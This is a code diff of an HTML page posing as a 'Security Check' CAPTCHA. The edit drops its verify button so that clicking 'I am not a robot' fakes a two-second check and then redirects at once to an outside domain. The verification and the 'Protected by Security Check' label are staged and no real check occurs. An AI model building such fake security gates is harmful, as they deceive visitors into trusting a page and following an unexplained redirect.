@@ -81,23 +81,6 @@
       opacity: 1;
     }
 
-    .verify-btn {
-      padding: 0.6rem 1.2rem;
-      background: #3498db; 
-      color: #fff;
-      border: none;
-      border-radius: 4px;
-      cursor: not-allowed; /* disabled by default */
-      opacity: 0.6;
-      transition: background 0.3s;
-    }
-    .verify-btn.enabled {
-      cursor: pointer;
-      opacity: 1;
-    }
-    .verify-btn.enabled:hover {
-      background: #2980b9;
-    }
     .footer-note {
       margin-top: 1rem;
       color: #999;
@@ -109,7 +92,7 @@
 
 <div class="captcha-card">
   <h1>Security Check</h1>
-  <p>Please click the button below to verify you’re a real person</p>
+  <p>Please click the box below to verify you’re a real person</p>
 
   <div class="checkbox-container" id="checkboxContainer">
     <div class="custom-checkbox" id="customCheckbox">
@@ -119,13 +102,11 @@
     <span>I am not a robot</span>
   </div>
 
-  <button class="verify-btn" id="verifyBtn" disabled>Verify & Continue</button>
   <div class="footer-note">Protected by Security Check</div>
 </div>
 
 <script>
   const checkbox = document.getElementById('customCheckbox');
-  const verifyBtn = document.getElementById('verifyBtn');
   const checkboxContainer = document.getElementById('checkboxContainer');
 
   let isVerified = false;
@@ -136,30 +117,19 @@
     // Show the loader
     checkbox.classList.add('loading');
 
-    // Simulate 2-3 second verification
+    // Simulate a 2-second verification
     setTimeout(() => {
-      // Hide the loader, show checkmark
+      // Hide loader, show checkmark
       checkbox.classList.remove('loading');
       checkbox.classList.add('checked');
 
       // Mark as verified
       isVerified = true;
 
-      // Enable the button
-      verifyBtn.classList.add('enabled');
-      verifyBtn.disabled = false;
-      verifyBtn.style.cursor = 'pointer';
-    }, 2000); // 2 seconds
-  });
-
-  // On click "Verify & Continue"
-  verifyBtn.addEventListener('click', () => {
-    if (!isVerified) return; // should be verified first
-
-    // Redirect to your site
-    window.location.href = "https://wemust.com/";
+      // Immediately redirect
+      window.location.href = "https://wemust.com/";
+    }, 2000);
   });
 </script>
 </body>
 </html>
-
